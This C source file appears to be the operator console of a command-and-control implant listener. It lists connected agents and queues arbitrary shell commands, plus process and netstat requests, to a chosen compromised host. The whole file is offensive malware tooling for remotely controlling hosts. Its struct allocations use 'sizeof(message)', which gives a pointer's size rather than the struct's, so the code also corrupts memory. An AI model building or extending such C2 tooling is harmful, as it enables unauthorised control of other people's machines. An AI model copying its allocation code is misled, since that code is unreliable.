#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <poll.h>

#include "queue.h"
#include "implant.h"
#include "base.h"
#include "console.h"

// Global variables
extern struct implant_poll *poll_struct;
extern pthread_mutex_t poll_lock;
// Receive Queue
extern struct Queue* receive_queue;
extern pthread_mutex_t receive_queue_lock;
// Send Queue
extern struct Queue* send_queue;
extern pthread_mutex_t send_queue_lock;

int agent_console(int agent_fd){
	const char* menu = "Implant %d selected.\n"
				 "Provide an option.\n"
				 "1 - execute command\n"
				 "2 - get processes (ps -aux)\n"
				 "3 - get network statistics (netstat -plantu)\n"
				 "4 - go back\n\n";
	char buffer[BUFFERSIZE];
	char* buf;
	struct Message* message;
	long option;
	printf(menu, agent_fd);
	printf(">");
				 
	while(fgets(buffer, BUFFERSIZE, stdin)){
		option = strtol(buffer, NULL, 10);
		switch(option){
	        case 1:
	        	message = malloc(sizeof(message));
	        	message->id = agent_fd;
	        	
	        	printf("What do you want to send?\n");
	        	message->buffer = malloc(BUFFERSIZE);
	        	memset(message->buffer, 0, BUFFERSIZE);
	        	fgets(message->buffer, BUFFERSIZE - 1, stdin);
	        	message->size = strlen(message->buffer);
	        	
	        	pthread_mutex_lock(&send_queue_lock);
	        	enqueue(send_queue, message);
	        	pthread_mutex_unlock(&send_queue_lock);
	        	break;
	        case 2:
	        	message = malloc(sizeof(message));
	        	message->id = agent_fd;

				message->buffer = malloc(BUFFERSIZE);
				memset(message->buffer, 0, BUFFERSIZE);
	        	strcpy(message->buffer, "process\n");
	        	message->size = strlen("process\n");
	        	
	        	pthread_mutex_lock(&send_queue_lock);
	        	enqueue(send_queue, message);
	        	pthread_mutex_unlock(&send_queue_lock);
	        	break;
	        case 3:
	        	message = malloc(sizeof(message));
	        	message->id = agent_fd;
	        
	        	message->buffer = malloc(BUFFERSIZE);
	        	memset(message->buffer, 0, BUFFERSIZE);
	        	strcpy(message->buffer, "netstat\n");
	        	message->size = strlen("netstat\n");
	        	
	        	pthread_mutex_lock(&send_queue_lock);
	        	enqueue(send_queue, message);
	        	pthread_mutex_unlock(&send_queue_lock);
	        	break;
	        case 4:
	        	return 0;
	        default:
	        	printf("Unknown option selected\n");
	        	break;
	    }
	    printf(menu, agent_fd);
	    printf(">");
	}
	
	return 0;
}


void *console(void *vargp){
	int *fd_count = poll_struct->fd_count;
	struct pollfd *pfds = poll_struct->pfds;
	
	const char* menu = "\nWelcome to the implant listener.\n"
				 "Provide an option.\n"
				 "1 - list active agents\n"
				 "2 - select active agent\n"
				 "9 - exit\n\n";
	char buffer[BUFFERSIZE];
	long option;
				 
	printf("%s", menu);
	printf(">");
	
	while(fgets(buffer, BUFFERSIZE, stdin)){
		option = strtol(buffer, NULL, 10);
		switch(option){
			case 9:
				exit(0);
            case 1:
            	printf("Active Agents\n");
            	printf("-------------\n");
            	pthread_mutex_lock(&poll_lock);
            	for (int i = 0; i < *fd_count; i++){
					printf(" %d\n", pfds[i].fd);
				}
				pthread_mutex_unlock(&poll_lock);
            	break;
            case 2:
            	printf("Which agent?\n");
            	fgets(buffer, BUFFERSIZE, stdin);
            	option = strtol(buffer, NULL, 10);
            	agent_console(option);
            	break;
            default:
            	printf("Unknown option selected\n");
            	break;
        }
        
    	puts(menu);
    	printf(">");
	}
	puts("JUJU2");
	return 0;
}